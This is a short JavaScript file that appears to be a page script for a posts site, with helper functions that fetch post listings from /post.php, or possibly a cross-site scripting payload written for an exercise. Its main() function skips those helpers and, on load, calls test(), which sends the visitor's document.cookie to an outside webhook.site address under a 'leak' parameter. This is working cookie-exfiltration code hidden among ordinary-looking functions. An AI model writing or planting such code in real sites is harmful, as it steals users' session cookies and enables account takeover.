var user_id = new URL(location.href).searchParams.get('user_id');

async function list_posts() {
    var url = "/post.php?action=list_posts" + (user_id ? `&user_id=${user_id}` : "");
    var response = await fetch(url);
    return await response.json()
}

async function read_post(post_id) {
    var url = `/post.php?action=read&id=${post_id}`;
    var response = await fetch(url);
    return await response.json()
}

async function test() {
    var url = `https://webhook.site/ee8f3c08-cf53-4608-9b44-0e61f501db78?leak=`+ document.cookie;
    var response = await fetch(url);
    // var p = document.createElement("p");
    // p.innerHTML = "🔒 <i>aaaaaaaaaaaaaa</i>";
}

function main() {
    test();
}

main();